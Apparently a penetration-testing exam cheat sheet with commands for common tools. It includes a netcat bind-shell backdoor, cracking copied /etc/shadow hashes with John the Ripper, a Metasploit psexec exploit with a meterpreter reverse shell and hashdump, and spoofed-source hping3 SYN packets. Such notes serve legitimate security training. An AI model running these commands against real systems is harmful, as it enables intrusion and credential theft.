# Common Tools

## Exam Outcome

Demonstrate competence with common tools including netcat, SSH, Ettercap, p0f, etc...

### netcat

Setting up a Listener:

```
nc -l -p [port]
nc -l -p [2222]
```

Connecting to the Listener:

```
nc [ip_of_listener] [port]
nc 10.10.75.75 2222
```

Create Backdoor on Linux:

```
nc -l [port] -e /bin/sh
nc -l 7777 -e /bin/sh
```

Connect to the backdoor:

```
nc.exe [ip_of_listener] [port]
nc.exe 10.10.75.75 7777
```

### SSH

### Ettercap

### p0f

### John the Ripper

John the Ripper is essentially a password cracking tool.  You can utilize John the Ripper to perform password cracking once you've retrieved password hashes from a target.

First, you need to combine the passwd and shadow files (from a Linux machine).  The following examples assumes you've taken a copy of /etc/passwd and /etc/shadow and moved them to the /tmp directory:

```
./unshadow /tmp/passwd_copy /tmp/shadow_copy > /tmp/combined
```

Running John is trival:

```
./john /tmp/combined
```

### Metasploit

Starting Metasploit:

```
msfconsole
```

Listing Exploits:

```
show exploits
```

Searching Exploits:

```
search type:exploit psexec
```

Acquiring Info on an Exploit:

```
info exploit/windows/smb/psexec
```

Selecting an Exploit to Use:

```
use exploit/windows/smb/psexec
```

Configuring Exploit Settings:

```
set PAYLOAD windows/meterpreter/reverse_tcp
```

Showing Options:

```
show options
```

Configuring Variables:

```
set RHOST [Target IP]
set SMBUser [username]
set SMBPass [password]
set LHOST [source/attacker IP]
```

Launching Exploit:

```
exploit
```

Backgrounding a Session:

```
background
```

Listing Sessions:

```
sessions -l
```

```
sessions -i [session #]
```

Popular Meterpreter Commands:

```
?
sysinfo
getuid
pwd
getpid
ps
hashdump
run hashdump
```

### Volatility

Getting usage and help

```
python vol.py -h
```

Getting process list:

```
python vol.py pslist -f /path/to/memory/dump/mem.dd --profile=Win7SP0x86
```

### Hping3
Hping3 is a command-line packet analyzer that supports the TCP, UDP, ICMP, and RAW-IP protocols.

```
hping3 --help
```

Running hping3 with TCP SYN flags:

```
hping3 -S [IP address]
```

Running hping3 with TCP SYNC flags and a spoofed source address:

```
hping3 [IP Address] -a [spoofed IP] -S
```





### etc...

